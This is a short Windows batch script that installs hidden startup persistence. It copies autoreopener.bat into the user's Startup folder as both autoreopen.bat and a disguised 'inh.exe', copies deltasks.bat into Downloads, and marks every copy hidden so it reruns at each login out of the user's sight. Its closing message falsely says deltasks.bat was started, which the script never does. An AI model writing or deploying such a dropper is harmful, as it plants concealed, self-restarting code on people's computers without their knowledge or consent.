@echo off
set "src=%~dp0autoreopener.bat"
set "startup=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"
set "downloads=%USERPROFILE%\Downloads"

copy "%src%" "%startup%\inh.exe" /Y
copy "%src%" "%startup%\autoreopen.bat" /Y
copy "%~dp0deltasks.bat" "%downloads%\deltasks.bat" /Y

attrib +h "%startup%\inh.exe"
attrib +h "%startup%\autoreopen.bat"
attrib +h "%downloads%\deltasks.bat"

if %ERRORLEVEL%==0 (
    echo Files copied and deltasks.bat started successfully.
) else (
    echo Copy failed. Check permissions.
)